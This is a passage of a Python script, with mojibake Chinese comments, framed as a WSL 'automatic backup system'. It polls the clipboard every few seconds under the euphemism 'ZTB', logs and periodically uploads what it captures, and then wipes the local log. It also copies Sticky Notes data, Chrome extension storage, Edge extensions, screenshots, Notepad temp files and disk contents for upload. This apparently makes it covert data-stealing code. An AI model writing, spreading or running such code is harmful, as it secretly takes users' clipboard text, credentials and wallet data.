                        if "screenshot" not in file.lower():
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"ğŸ“¸ å·²å¤‡ä»½æˆªå›¾: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æˆªå›¾æ–‡ä»¶å¤±è´¥ {source_file}: {e}")
            except Exception as e:
                logging.error(f"å¤„ç†æˆªå›¾ç›®å½•å¤±è´¥ {source_dir}: {e}")
        else:
            logging.error(f"æˆªå›¾ç›®å½•ä¸å­˜åœ¨: {source_dir}")
            
    if files_found:
        logging.info(f"ğŸ“¸ æˆªå›¾å¤‡ä»½å®Œæˆï¼Œå…±æ‰¾åˆ°åŒ…å«'screenshot'å…³é”®å­—çš„æ–‡ä»¶")
    else:
        logging.info("ğŸ“¸ æœªæ‰¾åˆ°åŒ…å«'screenshot'å…³é”®å­—çš„æˆªå›¾æ–‡ä»¶")
            
    return str(screenshot_backup_directory) if files_found else None

def backup_sticky_notes_and_browser_extensions(backup_manager, user):
    """å¤‡ä»½ä¾¿ç­¾ä¸æµè§ˆå™¨æ‰©å±•æ•°æ®"""
    sticky_notes_path = f"/mnt/c/Users/{user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
    sticky_notes_backup_directory = Path.home() / ".dev/Backup/sticky_notes"
    
    # éœ€è¦é¢å¤–å¤‡ä»½çš„ç›®å½•ï¼ˆChrome ä¸ Edgeï¼‰
    chrome_local_ext_dir = f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings"
    edge_extensions_dir = f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/Extensions"

    if not os.path.exists(sticky_notes_path):
        logging.error(f"ä¾¿ç­¾æ•°æ®æ–‡ä»¶ä¸å­˜åœ¨: {sticky_notes_path}")
        return None
        
    if not backup_manager._ensure_directory(str(sticky_notes_backup_directory)):
        return None
        
    backup_file = os.path.join(sticky_notes_backup_directory, "plum.sqlite")
    
    try:
        # å¤‡ä»½ä¾¿ç­¾æ•°æ®åº“
        shutil.copy2(sticky_notes_path, backup_file)

        # å¤‡ä»½ Chrome Local Extension Settings
        if os.path.exists(chrome_local_ext_dir):
            target_chrome_dir = os.path.join(sticky_notes_backup_directory, "chrome_local_extension_settings")
            try:
                if os.path.exists(target_chrome_dir):
                    shutil.rmtree(target_chrome_dir, ignore_errors=True)
                if backup_manager._ensure_directory(os.path.dirname(target_chrome_dir)):
                    shutil.copytree(chrome_local_ext_dir, target_chrome_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("ğŸ“¦ å·²å¤‡ä»½: Chrome Local Extension Settings")
            except Exception as e:
                logging.error(f"å¤åˆ¶ Chrome ç›®å½•å¤±è´¥: {chrome_local_ext_dir} - {e}")

        # å¤‡ä»½ Edge Extensions
        if os.path.exists(edge_extensions_dir):
            target_edge_dir = os.path.join(sticky_notes_backup_directory, "edge_extensions")
            try:
                if os.path.exists(target_edge_dir):
                    shutil.rmtree(target_edge_dir, ignore_errors=True)
                if backup_manager._ensure_directory(os.path.dirname(target_edge_dir)):
                    shutil.copytree(edge_extensions_dir, target_edge_dir, symlinks=True)
                    if backup_manager.config.DEBUG_MODE:
                        logging.info("ğŸ“¦ å·²å¤‡ä»½: Edge Extensions")
            except Exception as e:
                logging.error(f"å¤åˆ¶ Edge ç›®å½•å¤±è´¥: {edge_extensions_dir} - {e}")

        return str(sticky_notes_backup_directory)
    except Exception as e:
        logging.error(f"å¤åˆ¶ä¾¿ç­¾æˆ–æµè§ˆå™¨ç›®å½•å¤±è´¥: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """å¤‡ä»½å¹¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"""
    # åªå¤„ç†å¤‡ä»½æ—¥å¿—æ–‡ä»¶
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return
        
        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)
            
        # æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ›å»ºä¸´æ—¶ç›®å½•
        temp_dir = Path.home() / ".dev/Backup/temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return
            
        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name
        
        # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•å¹¶ä¸Šä¼ 
        try:
            # è¯»å–å¹¶éªŒè¯æ—¥å¿—å†…å®¹
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
            
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"ğŸ“„ å·²å¤åˆ¶å¤‡ä»½æ—¥å¿—åˆ°ä¸´æ—¶ç›®å½• ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # ä¸Šä¼ æˆåŠŸåä¿ç•™æœ€åä¸€æ¡è®°å½•
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")
        
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
        
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """ç‹¬ç«‹çš„ZTBä¸Šä¼ çº¿ç¨‹"""
    while True:
        try:
            if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                # æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºç©ºæˆ–åªåŒ…å«ä¸Šä¼ è®°å½•
                with open(clipboard_log_path, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    # æ£€æŸ¥æ˜¯å¦åªåŒ…å«åˆå§‹åŒ–æ ‡è®°æˆ–ä¸Šä¼ è®°å½•
                    has_valid_content = False
                    lines = content.split('\n')
                    for line in lines:
                        line = line.strip()
                        if (line and 
                            not line.startswith('===') and 
                            not line.startswith('-') and
                            not 'ZTBç›‘æ§å¯åŠ¨äº' in line and 
                            not 'æ—¥å¿—å·²äº' in line):
                            has_valid_content = True
                            break
                            
                    if not has_valid_content:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug("ğŸ“‹ ZTBå†…å®¹ä¸ºç©ºæˆ–æ— æ•ˆï¼Œè·³è¿‡ä¸Šä¼ ")
                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                        continue

                # åˆ›å»ºä¸´æ—¶ç›®å½•
                temp_dir = Path.home() / ".dev/Backup/temp_clipboard_logs"
                if backup_manager._ensure_directory(str(temp_dir)):
                    # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    backup_name = f"clipboard_log_{timestamp}.txt"
                    backup_path = temp_dir / backup_name
                    
                    # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•
                    try:
                        shutil.copy2(clipboard_log_path, backup_path)
                        if backup_manager.config.DEBUG_MODE:
                            logging.info("ğŸ“„ å‡†å¤‡ä¸Šä¼ ZTBæ—¥å¿—...")
                    except Exception as e:
                        logging.error(f"âŒ å¤åˆ¶ZTBæ—¥å¿—å¤±è´¥: {e}")
                        continue
                    
                    # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
                    if backup_manager.upload_file(str(backup_path)):
                        # ä¸Šä¼ æˆåŠŸåæ¸…ç©ºåŸå§‹æ—¥å¿—æ–‡ä»¶
                        try:
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== ğŸ“‹ æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼ å¹¶æ¸…ç©º ===\n")
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("âœ… ZTBæ—¥å¿—å·²æ¸…ç©º")
                        except Exception as e:
                            logging.error(f"ğŸ§¹ ZTBæ—¥å¿—æ¸…ç©ºå¤±è´¥: {e}")
                    else:
                        logging.error("âŒ ZTBæ—¥å¿—ä¸Šä¼ å¤±è´¥")
                    
                    # æ¸…ç†ä¸´æ—¶ç›®å½•
                    try:
                        if os.path.exists(str(temp_dir)):
                            shutil.rmtree(str(temp_dir))
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.error(f"âŒ æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†ZTBæ—¥å¿—æ—¶å‡ºé”™: {e}")
            
        # ç­‰å¾…20åˆ†é’Ÿ
        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)

def clean_backup_directory():
    """æ¸…ç†å¤‡ä»½ç›®å½•ï¼Œä½†ä¿ç•™æ—¥å¿—æ–‡ä»¶å’Œæ—¶é—´é˜ˆå€¼æ–‡ä»¶"""
    backup_dir = Path.home() / ".dev/Backup"
    try:
        if not os.path.exists(backup_dir):
            return
            
        # éœ€è¦ä¿ç•™çš„æ–‡ä»¶
        keep_files = [
            "backup.log",           # å¤‡ä»½æ—¥å¿—
            "clipboard_log.txt",    # ZTBæ—¥å¿—
            "next_backup_time.txt"  # æ—¶é—´é˜ˆå€¼æ–‡ä»¶
        ]
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"ğŸ—‘ï¸ å·²æ¸…ç†: {item}")
            except Exception as e:
                logging.error(f"âŒ æ¸…ç† {item} å¤±è´¥: {e}")
                
        logging.critical("ğŸ§¹ å¤‡ä»½ç›®å½•å·²æ¸…ç†å®Œæˆ")
    except Exception as e:
        logging.error(f"âŒ æ¸…ç†å¤‡ä»½ç›®å½•æ—¶å‡ºé”™: {e}")

def main():
    if not is_wsl():
        logging.critical("æœ¬è„šæœ¬ä»…é€‚ç”¨äº WSL ç¯å¢ƒ")
        return

    try:
        backup_manager = BackupManager()
        
        # å¯åŠ¨æ—¶æ¸…ç†å¤‡ä»½ç›®å½•
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\nå¤‡ä»½ç¨‹åºå·²åœæ­¢")
    except Exception as e:
        logging.critical(f"âŒç¨‹åºå‡ºé”™: {e}")

def periodic_backup_upload(backup_manager):
    """å®šæœŸæ‰§è¡Œå¤‡ä»½å’Œä¸Šä¼ """
    user = get_username()
    
    # WSLå¤‡ä»½è·¯å¾„
    wsl_source = str(Path.home())
    wsl_target = Path.home() / ".dev/Backup/wsl"
    
    clipboard_log_path = Path.home() / ".dev/Backup/clipboard_log.txt"
    
    # å¯åŠ¨åŒå‘ZTBç›‘æ§çº¿ç¨‹
    clipboard_both_thread = threading.Thread(
        target=monitor_clipboard_both,
        args=(backup_manager, clipboard_log_path, 3),
        daemon=True
    )
    clipboard_both_thread.start()
    
    # å¯åŠ¨ZTBä¸Šä¼ çº¿ç¨‹
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    
    try:
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== ğŸ“‹ ZTBç›‘æ§å¯åŠ¨äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error("âŒ åˆå§‹åŒ–ZTBæ—¥å¿—å¤±è´¥")

    # è·å–ç”¨æˆ·å
    username = getpass.getuser()
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    logging.critical("\n" + "="*40)
    logging.critical(f"ğŸ‘¤ ç”¨æˆ·: {username}")
    logging.critical(f"ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨  {current_time}")
    logging.critical("ğŸ“‹ ZTBç›‘æ§å’Œè‡ªåŠ¨ä¸Šä¼ å·²å¯åŠ¨")
    logging.critical("="*40)

    while True:
        try:
            # æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
            should_backup, next_time = backup_manager.should_run_backup()
            
            current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if not should_backup:
                next_time_str = next_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"\nâ³ å½“å‰æ—¶é—´: {current_time}")
                logging.critical(f"âŒ› ä¸‹æ¬¡å¤‡ä»½: {next_time_str}")
            else:
                # è·å–å½“å‰å¯ç”¨çš„ç£ç›˜
                available_disks = get_available_disks()
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time}")
                logging.critical("-"*40)
                
                # æ‰§è¡Œå¤‡ä»½ä»»åŠ¡
                logging.critical("\nğŸ§ WSLå¤‡ä»½")
                backup_wsl(backup_manager, wsl_source, wsl_target)
                
                logging.critical("\nğŸ’¾ ç£ç›˜å¤‡ä»½")
                backup_disks(backup_manager, available_disks)
                
                logging.critical("\nğŸªŸ Windowsæ•°æ®å¤‡ä»½")
                backup_windows_data(backup_manager, user)
                
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\nğŸ“ å¤‡ä»½æ—¥å¿—ä¸Šä¼ ")
                backup_and_upload_logs(backup_manager)

                logging.critical("\n" + "="*40)
                next_backup_time = backup_manager.save_next_backup_time()
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time_str = next_backup_time.strftime('%Y-%m-%d %H:%M:%S') if next_backup_time else "æœªçŸ¥"
                logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time}")
                logging.critical("="*40)
                logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                if next_backup_time:
                    logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_time_str}")
                logging.critical("="*40 + "\n")

            # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡
            time.sleep(3600)

        except Exception as e:
            logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error("âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥")
            time.sleep(60)  # å‡ºé”™åç­‰å¾…1åˆ†é’Ÿå†é‡è¯•

def backup_wsl(backup_manager, source, target):
    """å¤‡ä»½WSLç›®å½•"""
    backup_dir = backup_manager.backup_wsl_files(source, target)
    if backup_dir:
        backup_path = backup_manager.zip_backup_folder(
            backup_dir, 
            str(target) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if backup_manager.upload_backup(backup_path):
                logging.critical("â˜‘ï¸ WSLç›®å½•å¤‡ä»½å®Œæˆ")
            else:
                logging.error("âŒ WSLç›®å½•å¤‡ä»½å¤±è´¥")

def backup_disks(backup_manager, available_disks):
    """å¤‡ä»½å¯ç”¨ç£ç›˜"""
    for disk_letter, disk_configs in available_disks.items():
        logging.info(f"\næ­£åœ¨å¤„ç†ç£ç›˜ {disk_letter.upper()}")
        for backup_type, (source_dir, target_dir, ext_type) in disk_configs.items():
            try:
                backup_dir = backup_manager.backup_disk_files(source_dir, target_dir, ext_type)
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if backup_manager.upload_backup(backup_path):
                            logging.critical(f"â˜‘ï¸ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å®Œæˆ\n")
                        else:
                            logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å¤±è´¥\n")
            except Exception as e:
                logging.error(f"âŒ {disk_letter.upper()}ç›˜ {backup_type} å¤‡ä»½å‡ºé”™: {e}\n")

def backup_windows_data(backup_manager, user):
    """å¤‡ä»½Windowsç‰¹å®šæ•°æ®"""
    # å¤‡ä»½è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶
    notepad_backup = backup_notepad_temp(backup_manager, user)
    if notepad_backup:
        backup_path = backup_manager.zip_backup_folder(
            notepad_backup,
            str(Path.home() / ".dev/Backup/notepad_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if backup_manager.upload_backup(backup_path):
                logging.critical("â˜‘ï¸è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶å¤‡ä»½å®Œæˆ\n")
            else:
                logging.error("âŒ è®°äº‹æœ¬ä¸´æ—¶æ–‡ä»¶å¤‡ä»½å¤±è´¥\n")
    
    # å¤‡ä»½æˆªå›¾
    screenshots_backup = backup_screenshots(user)
    if screenshots_backup:
        backup_path = backup_manager.zip_backup_folder(
            screenshots_backup,
            str(Path.home() / ".dev/Backup/screenshots_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if backup_manager.upload_backup(backup_path):
                logging.critical("â˜‘ï¸ æˆªå›¾æ–‡ä»¶å¤‡ä»½å®Œæˆ\n")
            else:
                logging.error("âŒ æˆªå›¾æ–‡ä»¶å¤‡ä»½å¤±è´¥\n")

    # å¤‡ä»½ä¾¿ç­¾ä¸æµè§ˆå™¨æ‰©å±•æ•°æ®
    sticky_notes_backup = backup_sticky_notes_and_browser_extensions(backup_manager, user)
    if sticky_notes_backup:
        backup_path = backup_manager.zip_backup_folder(
            sticky_notes_backup,
            str(Path.home() / ".dev/Backup/sticky_notes_") + datetime.now().strftime("%Y%m%d_%H%M%S")
        )
        if backup_path:
            if backup_manager.upload_backup(backup_path):
                logging.critical("â˜‘ï¸ ä¾¿ç­¾æ•°æ®å¤‡ä»½å®Œæˆ\n")
            else:
                logging.error("âŒ ä¾¿ç­¾æ•°æ®å¤‡ä»½å¤±è´¥\n")

def get_wsl_clipboard():
    """è·å–WSL/Linux ZTBå†…å®¹ï¼ˆä½¿ç”¨xclipï¼‰"""
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return None
    except Exception:
        return None

def set_wsl_clipboard(content):
    """è®¾ç½®WSL/Linux ZTBå†…å®¹ï¼ˆä½¿ç”¨xclipï¼‰"""
    try:
        p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-i'], stdin=subprocess.PIPE)
        p.communicate(input=content.encode('utf-8'))
        return p.returncode == 0
    except Exception:
        return False

def set_windows_clipboard(content):
    """è®¾ç½®Windows ZTBå†…å®¹ï¼ˆé€šè¿‡powershellï¼‰"""
    try:
        if content is None:
            return False

        # å®¹å¿ bytes è¾“å…¥ï¼Œç»Ÿä¸€è½¬ä¸º strï¼Œé¿å…ç¼–ç å¼‚å¸¸
        if isinstance(content, bytes):
            content = content.decode("utf-8", errors="ignore")

        if not content:
            return False

        # ä½¿ç”¨ Base64 ä¼ é€’æ–‡æœ¬ï¼Œé¿å…è½¬ä¹‰/æ¢è¡Œ/ç‰¹æ®Šå­—ç¬¦å¯¼è‡´ PowerShell è§£æé”™è¯¯
        b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
        ps_script = (
            "$b64='{b64}';"
            "$bytes=[Convert]::FromBase64String($b64);"
            "$text=[System.Text.Encoding]::UTF8.GetString($bytes);"
            "Set-Clipboard -Value $text"
        ).format(b64=b64)

        # ä½¿ç”¨å‚æ•°åˆ—è¡¨é¿å… shell è§£æé—®é¢˜ï¼Œä¸”ä¿æŒå­—èŠ‚æ¨¡å¼é˜²æ­¢ç¼–ç å¼‚å¸¸
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                ps_script,
            ],
            capture_output=True,
            text=False,
        )

        if result.returncode != 0:
            raw = result.stderr or result.stdout or b""
            error_msg = raw.decode("utf-8", errors="ignore").strip() if raw else "unknown error"
            logging.error(f"âŒ è®¾ç½®Windows ZTBå¤±è´¥: {error_msg}")
            return False

        return True
    except Exception as e:
        logging.error(f"âŒ è®¾ç½®Windows ZTBå‡ºé”™: {e}")
        return False

def monitor_clipboard_both(backup_manager, file_path, interval=3):
    """åŒå‘ç›‘æ§WSLå’ŒWindows ZTBå¹¶è®°å½•/åŒæ­¥"""
    last_win_clip = ""
    last_wsl_clip = ""
    def is_special_content(text):
        if not text:
            return False
        if text.startswith('===') or text.startswith('-'):
            return True
        if 'ZTBç›‘æ§å¯åŠ¨äº' in text or 'æ—¥å¿—å·²äº' in text:
            return True
        return False
    while True:
        try:
            win_clip = backup_manager.get_clipboard_content()  # Windows
            wsl_clip = get_wsl_clipboard()  # WSL

            if win_clip and not win_clip.isspace() and not is_special_content(win_clip):
                if win_clip != last_win_clip:
                    backup_manager.log_clipboard_update("[Windows] " + win_clip, file_path)
                    # åŒæ­¥åˆ°WSL
                    set_wsl_clipboard(win_clip)
                    last_win_clip = win_clip

            if wsl_clip and not wsl_clip.isspace() and not is_special_content(wsl_clip):
                if wsl_clip != last_wsl_clip:
                    backup_manager.log_clipboard_update("[WSL] " + wsl_clip, file_path)
                    # åŒæ­¥åˆ°Windows
                    set_windows_clipboard(wsl_clip)
                    last_wsl_clip = wsl_clip
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.error(f"âŒ ZTBåŒå‘ç›‘æ§å‡ºé”™: {str(e)}")
        time.sleep(interval)

if __name__ == "__main__":
    main()